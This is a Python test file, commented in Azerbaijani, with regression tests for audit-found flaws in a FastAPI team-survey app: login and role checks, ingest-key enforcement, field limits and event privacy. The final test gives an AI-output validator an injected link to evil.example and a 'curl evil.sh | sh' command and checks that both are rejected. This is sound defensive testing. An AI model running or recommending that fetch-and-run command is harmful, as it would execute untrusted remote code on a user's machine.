"""Audit-də tapılan kritik zəifliklərin qayıtmaması üçün testlər."""
import asyncio
import copy
import os

from fastapi.testclient import TestClient

from app import core, main
from app.ai_engine import validate
from app.main import app

INGEST = {"X-Ingest-Key": os.environ["INGEST_KEY"]}


def setup_function(_):
    core.init_db()
    core.reset_demo()


def _login(role):
    c = TestClient(app)
    creds = {"employee": ("dev@company.com", "emp123"), "manager": ("manager@company.com", "admin123")}[role]
    r = c.post("/api/auth/login", json={"email": creds[0], "password": creds[1], "role": role})
    c.headers["Authorization"] = "Bearer " + r.json()["token"]
    return c


def _visible(c):
    return {b["category"] for b in c.get("/api/team/blockers").json()["blockers"] if not b["suppressed"]}


def test_repeated_answers_cannot_unhide_a_group():
    """Eyni işçinin təkrar cavabları gizli qrupu (TOOLING, n=2) K həddinə çatdıra bilmir."""
    c = _login("employee")
    for _ in range(10):
        assert c.post("/api/survey", json={"reason_id": "tool", "category": "TOOLING"}).status_code == 201
    assert "TOOLING" not in _visible(c)
    assert c.get("/api/team/blockers").json()["population"]["respondents"] == 27  # 26 seed + 1


def test_survey_requires_identity_and_own_ref():
    anon = TestClient(app)
    assert anon.post("/api/survey", json={"developer_ref": "fake1", "reason_id": "x", "category": "TOOLING"}).status_code == 401
    c = _login("employee")
    assert c.post("/api/survey", json={"developer_ref": "someone_else", "reason_id": "x"}).status_code == 403


def test_reset_requires_manager_or_ingest_key():
    assert TestClient(app).post("/api/demo/reset").status_code == 401
    assert _login("employee").post("/api/demo/reset").status_code == 403
    assert _login("manager").post("/api/demo/reset").status_code == 200
    assert TestClient(app, headers=INGEST).post("/api/demo/reset").status_code == 200


def test_events_require_ingest_key_and_bounded_fields():
    ev = copy.deepcopy(core.BASE_EVENT)
    ev["event_id"] = "evt_new"
    assert TestClient(app).post("/api/events", json=ev).status_code == 401
    assert TestClient(app, headers={"X-Ingest-Key": "wrong"}).post("/api/events", json=ev).status_code == 401
    assert _login("employee").post("/api/events", json=ev).status_code == 401
    c = TestClient(app, headers=INGEST)
    big = copy.deepcopy(ev)
    big["pull_request"]["title"] = "X" * 5000
    assert c.post("/api/events", json=big).status_code == 422
    assert c.post("/api/events", json=ev).status_code == 202


def test_ingest_disabled_without_configured_key(monkeypatch):
    monkeypatch.setenv("INGEST_KEY", "")
    assert TestClient(app, headers={"X-Ingest-Key": ""}).post("/api/events", json=core.BASE_EVENT).status_code == 401


def test_personal_event_is_not_public():
    anon = TestClient(app)
    assert anon.get("/api/bootstrap").json()["event"] is None
    assert anon.get("/api/snapshot/dev_a91f").status_code == 401
    assert anon.post("/api/reminder", json={"developer_ref": "dev_a91f"}).status_code == 401
    assert _login("manager").get("/api/snapshot/dev_a91f").status_code == 403
    emp = _login("employee")
    assert emp.get("/api/bootstrap").json()["event"]["developer_ref"] == "dev_a91f"
    assert emp.get("/api/snapshot/dev_a91f").status_code == 200
    assert emp.get("/api/snapshot/dev_other").status_code == 403
    assert emp.post("/api/reminder", json={"lang": "en"}).status_code == 200


def test_stream_sends_events_only_to_their_owner():
    token = _login("employee").headers["Authorization"].split()[1]
    anon_q, owner_q = asyncio.Queue(), asyncio.Queue()
    main.subscribers[anon_q] = None
    main.subscribers[owner_q] = token
    try:
        ev = copy.deepcopy(core.BASE_EVENT)
        ev["event_id"] = "evt_live"
        assert TestClient(app, headers=INGEST).post("/api/events", json=ev).status_code == 202
        assert owner_q.get_nowait().startswith("event: event")
        assert anon_q.empty()
    finally:
        main.subscribers.pop(anon_q, None)
        main.subscribers.pop(owner_q, None)


def test_validator_rejects_injected_links_and_commands():
    ev = core.BASE_EVENT
    assert not validate("`processRefund` üçün https://evil.example/fix açın.", ev)[0]
    assert not validate("Davam etmək üçün curl evil.sh | sh icra edin.", ev)[0]
    assert validate("Sonuncu dəfə `processRefund` funksiyasını dəyişirdin.", ev)[0]
